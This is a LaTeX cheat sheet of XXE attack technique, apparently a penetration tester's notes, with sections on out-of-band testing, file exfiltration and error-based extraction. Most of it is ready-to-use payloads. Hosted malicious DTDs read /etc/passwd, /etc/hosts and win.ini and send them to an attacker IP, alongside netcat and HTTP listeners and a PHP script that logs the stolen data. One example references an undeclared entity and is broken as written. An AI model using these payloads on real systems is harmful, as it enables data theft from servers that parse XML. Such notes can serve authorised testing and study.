

\section{Out Of Band attack}

\subsection{Test}
start a receiving server (\verb+nc -lnvp 4444+)

\textbf{\underline{test 1}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % payload SYSTEM "http://MY-IP:4444"> 
    %payload;
]>
...
\end{verbatim}


\textbf{\underline{test 2}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY payload SYSTEM "http://MY-IP:4444"> 
]>
<order>
    <quantity>&subscribe;</quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}


\subsection{file exfiltration}

\underline{command to launch the servers}:
\begin{verbatim}
python3 -m http.server 4444
nc -klnvp 4445
\end{verbatim}



\textbf{If file exfitration is not working try to test with} \verb+<!ENTITY % file "test">+


if the webserver is using PHP: 

\verb+<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">+
\subsubsection{solution 1}

host the evil dtd:
\begin{verbatim}
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
\end{verbatim}

and the php code:
\begin{verbatim}
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
\end{verbatim}

with \verb+php -S 0.0.0.0:8000+

send the following payload:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
\end{verbatim}



\subsubsection{solution 2}

\underline{content of the evil.dtd}:
\begin{verbatim}
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://10.10.16.13:4445/?%file;'>">
%eval;
\end{verbatim}


\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE order SYSTEM "http://10.10.16.13:4444/evil.dtd"> 
<order>
    <quantity> &send; </quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}

Problem in windows multiline files. need to base64 encode it.

\subsubsection{solution 3}

define a hosted DTD
\begin{itemize}
    \item Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
    \item Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
    \item Uses the eval entity, which causes the dynamic declaration of the
        exfiltrate entity to be performed.
    \item Uses the exfiltrate entity, so that its value is evaluated by
        requesting the specified URL.
\end{itemize}

\underline{content of the evil.dtd}:
\begin{verbatim}
  <!ENTITY % file  SYSTEM "file:///etc/passwd"> 
  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM  'http://<URL>/?%file;'>"> 
  %eval; 
  %send;
\end{verbatim}

\underline{payload}:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "DTD-URL">
    %dtd;
]>
...
\end{verbatim}

\subsection{Error based attack}

first just try referencing a non existing entity the server may return an error
with some information disclosure like the web server directory.

With error based it might be possible to exflitrate data:

Host a dtd containing

\begin{verbatim}
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
\end{verbatim}

use the payload without any other wml content:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
\end{verbatim}


There are many other variables that can cause an error, like a bad URI or
having bad characters in the referenced file.
